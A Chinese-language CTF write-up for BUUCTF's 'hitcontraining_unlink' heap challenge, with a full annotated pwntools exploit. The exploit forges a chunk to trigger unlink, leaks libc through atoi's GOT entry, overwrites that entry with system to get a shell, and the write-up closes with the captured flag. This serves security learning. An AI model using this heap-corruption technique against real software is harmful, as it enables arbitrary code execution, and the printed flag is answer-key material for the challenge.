# hitcontraining_unlink

[题目地址](https://buuoj.cn/challenges#hitcontraining_unlink)

现在我要怀疑我是否智商有问题了，到现在还学不会真的是智商低于常人了。

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

打开main函数，感觉这题似曾相识，之前肯定见过。

```c
```

show_item没啥好看的，就是展示内容，经常用于泄露地址。

```c
```

add_item函数重点关注堆块的管理结构。

```c
```

看起来好像是有两个数组，一个放boxes地址一个itemlist放大小，不过实际调试一下就知道只有一个itemlist，如下：

```
There is a box with magic
what do you want to do in the box
----------------------------
Bamboobox Menu
----------------------------
1.show the items in the box
2.add a new item
3.change the item in the box
4.remove the item in the box
5.exit
----------------------------
Your choice:2
Please enter the length of item name:128
Please enter the name of item:aaaaaaaaaaaaaa

Breakpoint 1, 0x0000000000400b21 in add_item ()
(gdb) x/32g 0x6020c8-8
0x6020c0 <itemlist>:    0x0000000000000080      0x0000000001df42c0
0x6020d0 <itemlist+16>: 0x0000000000000000      0x0000000000000000
0x6020e0 <itemlist+32>: 0x0000000000000000      0x0000000000000000
0x6020f0 <itemlist+48>: 0x0000000000000000      0x0000000000000000
0x602100 <itemlist+64>: 0x0000000000000000      0x0000000000000000
0x602110 <itemlist+80>: 0x0000000000000000      0x0000000000000000
0x602120 <itemlist+96>: 0x0000000000000000      0x0000000000000000
```

全部堆块由itemlist管理，前8位存大小，后8位存堆块指针。change_item则老毛病了，任意堆溢出。

```c
```

remove非常正常，无uaf。

```c
```

还有个magic后门函数，就不看了，这题里因为buuctf的环境配置错误进而没用。如果有用的话可以直接fastbin attack让堆块分配到main函数里打招呼的函数指针那块，直接改为magic即可得flag。参考[wp](https://blog.csdn.net/mcmuyanga/article/details/113105091)，不过wp的另一个unlink解法才是我们要学的。

```python
from pwn import *
context.log_level = 'debug'
p = remote('node4.buuoj.cn',28786)

def add(size,content):
    p.sendlineafter('Your choice:','2')
    p.sendlineafter('name:',str(size))
    p.sendafter('item:',content)


def show():
    p.sendlineafter('Your choice:','1')


def edit(idx,size,content):
    p.sendlineafter('Your choice:','3')
    p.sendafter('item:',str(idx))
    p.sendlineafter('name:',str(size))
    p.sendafter('item:',content)


def delete(idx):
    p.sendlineafter('Your choice:','4')
    p.sendafter('item:',str(idx))
add(0x40,'a')
add(0x80,'b') #注意这个堆块申请时的size域是0x91,多出来的16是prev_size和dize，还剩个1是标记位，表示前一个堆块处于分配状态。
add(0x20,'c')
ptr=0x6020c8 #unlink攻击的ptr。这里就是itemlist中装第一个堆块的地址。一般都选第一个，选后面的没必要
fake_chunk=p64(0)+p64(0x41)+p64(ptr-0x18)+p64(ptr-0x10)+b'c'*0x20+p64(0x40)+p64(0x90) #标准fake_chunk payload。prev_size+size+fd+bk+fake_chunk的填充内容，任意即可+下一个堆块的prev_size+size。因为我们是在0号堆块内部构造的fake_chunk，所以size是0x41，p64(0)+p64(0x41)+p64(ptr-0x18)+p64(ptr-0x10)+b'c'*0x20这段fake_chunk大小刚好是0x40，都是对应上的。后面溢出的chunk1的prev_size也要对应着是0x40，不是0x41是因为我们想让程序把fake_chunk看为free状态，触发unlink向前合并
edit(0,len(fake_chunk),fake_chunk)
delete(1)
payload=p64(0)*2+p64(0x40)+p64(0x602068)
edit(0,len(payload),payload) #unlink后0x6020c8的地址处就是0x6020b0了，unlink的效果就是让*ptr=ptr-0x18。那么那个payload就是在编辑0x6020b0处，2个p64(0)填充，p64(0x40)是itemlist记录的大小，不要改动，p64(0x602068)将atoi got地址写入itemlist第一个指针
show() #此时show就能获得atoi的真实地址
p.recvuntil("0 : ")
atoi_addr=u64(p.recvuntil('\x7f').ljust(8,b'\x00'))
libc_base=atoi_addr-224896
system=libc_base+283536
edit(0,8,p64(system)) #编辑atoi的got表为system
p.sendline('/bin/sh')
p.interactive()
```

## Flag
> flag{1cf4d514-83e1-456d-b0da-e32c37edc3ed}